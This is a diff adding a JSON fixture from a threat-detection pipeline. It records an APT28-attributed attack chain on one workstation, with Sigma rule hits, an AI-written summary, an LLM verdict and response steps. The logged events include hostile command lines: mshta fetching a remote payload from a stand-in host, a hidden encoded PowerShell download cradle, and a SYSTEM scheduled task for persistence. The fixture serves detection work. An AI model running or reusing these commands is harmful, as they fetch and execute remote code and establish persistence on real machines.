@@ -1,0 +1,78 @@
+{
+  "chain_id": "6966fa87-8a76-5910-b216-61ffb99ec038",
+  "hos_rule_id": "40500000-0000-4000-8000-000000000028",
+  "active_threat_id": "a7000000-0000-4000-8000-000000000028",
+  "active_threat": {
+    "name": "APT28",
+    "threat_type": "APT",
+    "severity": "CRITICAL",
+    "industries": ["Government", "Defense", "Energy"],
+    "geographies": ["Europe", "North America"],
+    "summary": "APT28 (Fancy Bear) is a Russian-linked threat actor associated with GRU Unit 26165. Known for spearphishing campaigns targeting government and defense sectors, frequently using living-off-the-land binaries and PowerShell for post-exploitation.",
+    "investigation": "Look for clustered execution of WinRAR archive extraction, MSHTA invocations, encoded PowerShell commands, and scheduled task creation under the same user/host within a 30-minute window. Pivot on the hostname to enumerate lateral movement attempts.",
+    "mitigation": "Patch CVE-2023-XXXX, enforce MFA on all privileged accounts, block executable email attachments, restrict MSHTA and Cscript/Wscript via AppLocker, monitor scheduled task creation by SYSTEM.",
+    "response": "Isolate affected host, revoke credentials of involved user accounts, hunt for lateral movement through SMB and WMI, capture memory and disk for forensic analysis, notify CISO and prepare for potential disclosure.",
+    "threat_actors": [
+      {
+        "id": "apt28",
+        "name": "APT28",
+        "description": "Russian GRU-linked advanced persistent threat group, also known as Fancy Bear, Sofacy, Sednit, Pawn Storm."
+      }
+    ]
+  },
+  "hos_tags": [
+    "attack.T1203",
+    "attack.T1105",
+    "attack.T1068",
+    "attack.T1119",
+    "attack.T1560.001",
+    "attack.T1070",
+    "active_threat.a7000000-0000-4000-8000-000000000028"
+  ],
+  "chain_type": "HOS",
+  "hostname": "WKST-FIN-05",
+  "username": null,
+  "window_start": "2026-04-22T09:30:00Z",
+  "first_seen": "2026-04-22T09:31:11Z",
+  "last_seen": "2026-04-22T09:31:31Z",
+  "coverage": 83.33,
+  "seqs": [
+    {"seq": 1, "hit": true,  "rule_ids": ["5e000002-0000-4000-8000-000000000002", "5e000003-0000-4000-8000-000000000003"]},
+    {"seq": 2, "hit": true,  "rule_ids": ["5e000004-0000-4000-8000-000000000004", "5e000005-0000-4000-8000-000000000005"]},
+    {"seq": 3, "hit": true,  "rule_ids": ["5e000006-0000-4000-8000-000000000006"]},
+    {"seq": 4, "hit": true,  "rule_ids": ["5e000007-0000-4000-8000-000000000007", "5e000008-0000-4000-8000-000000000008", "5e000009-0000-4000-8000-000000000009", "5e00000a-0000-4000-8000-00000000000a", "5e00000b-0000-4000-8000-00000000000b", "5e00000c-0000-4000-8000-00000000000c"]},
+    {"seq": 5, "hit": true,  "rule_ids": ["5e00000d-0000-4000-8000-00000000000d", "5e00000e-0000-4000-8000-00000000000e", "5e00000f-0000-4000-8000-00000000000f"]},
+    {"seq": 6, "hit": false, "rule_ids": ["5e000010-0000-4000-8000-000000000010"]}
+  ],
+  "events": [
+    {"event_id": "evt-apt28-001", "sigma_rule_id": "5e000002-0000-4000-8000-000000000002", "rule_db_id": "case-5e000002", "sigma_rule_title": "Suspicious Execution From RAR Archive", "seq": 1, "timestamp": "2026-04-22T09:31:11Z", "technique_ids": ["T1204"], "pipeline_id": "11111111-1111-4111-8111-111111111111", "parsed_event": {"process_name": "WinRAR.exe", "command_line": "C:\\Program Files\\WinRAR\\WinRAR.exe x payload.rar"}},
+    {"event_id": "evt-apt28-002", "sigma_rule_id": "5e000004-0000-4000-8000-000000000004", "rule_db_id": "case-5e000004", "sigma_rule_title": "MSHTA Execution with Suspicious File Extensions", "seq": 2, "timestamp": "2026-04-22T09:31:16Z", "technique_ids": ["T1218.005"], "pipeline_id": "11111111-1111-4111-8111-111111111111", "parsed_event": {"process_name": "mshta.exe", "command_line": "mshta.exe http://malicious.example.com/payload.hta"}},
+    {"event_id": "evt-apt28-003", "sigma_rule_id": "5e000006-0000-4000-8000-000000000006", "rule_db_id": "case-5e000006", "sigma_rule_title": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript", "seq": 3, "timestamp": "2026-04-22T09:31:21Z", "technique_ids": ["T1059.005"], "pipeline_id": "11111111-1111-4111-8111-111111111111", "parsed_event": {"process_name": "wscript.exe", "command_line": "wscript.exe payload.vbs"}},
+    {"event_id": "evt-apt28-004", "sigma_rule_id": "5e000009-0000-4000-8000-000000000009", "rule_db_id": "case-5e000009", "sigma_rule_title": "PowerShell Base64 Encoded IEX Cmdlet", "seq": 4, "timestamp": "2026-04-22T09:31:26Z", "technique_ids": ["T1059.001"], "pipeline_id": "22222222-2222-4222-8222-222222222222", "parsed_event": {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQA="}},
+    {"event_id": "evt-apt28-005", "sigma_rule_id": "5e00000d-0000-4000-8000-00000000000d", "rule_db_id": "case-5e00000d", "sigma_rule_title": "Scheduled Task Creation Via Schtasks.EXE", "seq": 5, "timestamp": "2026-04-22T09:31:31Z", "technique_ids": ["T1053.005"], "pipeline_id": "11111111-1111-4111-8111-111111111111", "parsed_event": {"process_name": "schtasks.exe", "command_line": "schtasks /create /tn WindowsUpdater /tr C:\\ProgramData\\winupd.exe /sc minute /mo 5 /ru SYSTEM"}}
+  ],
+  "event_count": 5,
+  "rule_count": 5,
+  "revision": 1,
+  "ai_summary": "This attack chain represents a multi-stage intrusion consistent with APT28 TTPs. The sequence begins with RAR archive extraction (T1204) on WKST-FIN-05 by user jsmith at 09:31, followed within minutes by MSHTA execution of a remote HTA payload (T1218.005) — a known living-off-the-land technique to bypass application allow-listing. The chain progresses through Wscript-driven VBS execution (T1059.005), Base64-encoded PowerShell with IEX-style download cradles (T1059.001), and culminates with SYSTEM-level scheduled task persistence (T1053.005). The 20-second time window, parent-child process lineage, and TTP composition strongly match APT28's documented playbook for credential-theft campaigns.",
+  "llm_verdict": "TRUE",
+  "llm_confidence": 0.87,
+  "llm_review": {
+    "reasoning": "All five fired sigma rules align with APT28's documented post-exploitation TTPs. The temporal proximity (20 seconds from RAR extraction to scheduled task creation), single hostname pivot, and consistent parent-child process chain (explorer → WinRAR → mshta → wscript → powershell) make a benign-software explanation implausible. Seq 6 (Whoami enumeration) is missing but not required at 60% threshold; this is consistent with operators who prefer LDAP/SMB enumeration over Whoami in mature environments.",
+    "indicators": [
+      "RAR archive execution from user profile",
+      "MSHTA loading remote HTA payload",
+      "Encoded PowerShell with IEX download cradle",
+      "Scheduled task created with SYSTEM privileges by powershell.exe parent",
+      "5/6 APT28 chain seqs hit within 20-second window on single hostname"
+    ],
+    "recommended_actions": [
+      "Isolate WKST-FIN-05 from network",
+      "Reset credentials for jsmith and any service accounts touched in the last 24 hours",
+      "Capture memory and forensic disk image",
+      "Hunt for lateral movement to file shares and AD",
+      "Submit malicious.example.com and the WindowsUpdater scheduled task IOCs to threat intel"
+    ]
+  },
+  "analysed_at": "2026-04-22T09:32:30Z"
+}
